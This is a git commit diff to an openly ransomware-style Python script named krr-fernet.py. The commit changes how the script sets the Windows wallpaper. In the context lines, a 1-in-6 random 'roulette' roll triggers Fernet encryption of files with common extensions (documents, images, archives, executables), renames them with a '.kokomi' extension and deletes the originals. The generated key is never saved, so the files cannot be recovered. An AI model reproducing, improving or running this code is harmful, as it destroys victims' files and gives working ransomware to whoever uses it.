b98feac46895bc9bad48e6c914e0f98de92b93d7
quantum <pablorubiocruz@gmail.com>
2023-08-05 01:30:23 -0600

    change wallpaper function

--- bin/krr-fernet.py
+++ bin/krr-fernet.py
@@ -5,16 +5,18 @@ import glob
 import secrets
 import string
 from cryptography.fernet import Fernet
-import wallpaper
 
 def chwall():
-    wallpaper.set_wallpaper('yfak.png')
+    import ctypes
+    wal_path = "C:\\Users\\quantum\\Documents\\kokomi\\yfak.png"
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, wal_path, 3)
 
 def kokomi():
     ransomExt = ".kokomi"
     fileExtensions = [".jpg", ".png", ".mkv", ".mp4", ".zip", ".rar", ".m4a", ".mp3", ".pdf", ".docx", ".pptx", ".xlsx", ".txt", ".exe", ".ink"]
     bullet = random.randint(1,6)
     if 1 == bullet:
+        chwall()
         print("You are dead")
         key = Fernet.generate_key()
         token = Fernet(key)
@@ -35,5 +37,5 @@ def kokomi():
                 os.remove(file)
     else:
         print("You are save")
-chwall()
+
 kokomi()
